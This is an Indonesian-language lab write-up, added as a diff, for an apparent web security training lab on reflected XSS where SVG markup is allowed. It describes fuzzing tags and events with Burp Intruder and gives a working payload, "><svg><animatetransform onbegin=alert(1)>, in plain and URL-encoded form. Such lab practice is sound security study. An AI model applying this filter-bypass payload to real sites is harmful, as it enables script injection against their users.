@@ -1,0 +1,32 @@
+Lab 7 Reflected XSS with some SVG markup allowed
+
+Brief:
+	situs ini memblokir tag umum tapi tidak dengan SVG tag dan events
+
+Tujuan:
+	lakukan alert()
+
+Analisa:
+	1. lakukan xss: <img src=1 onerror=alert(1)>
+		dan ini tidak berhasil
+
+	2. kirim responsenya ke intruder dan set posisi jadi
+		<$$>
+
+	3. copy tag dari xss cheet sheat dan paste ke payload
+
+	4. start attack dan ketika selesai ada status code 200
+		<img> <svg> <animatedtransform> <title>
+
+	5. ke intruder lagi set posisi parameternya dan tambahkan posisi di
+
+		<svg><animatedtransform%20$$=1>
+
+	6. copy event dari cheet shet lalu paste di payload dan start attack
+
+	7. ketika selesai ada satu response yang status code 200 yaitu onbegin
+
+	8. masukan payload ke pencarian atau melalui url dengan parameter search: https://0a9c003b03c893108079955c00de0035.h1-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+
+	
+	payload: "><svg><animatetransform onbegin=alert(1)> dan encodenya %22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
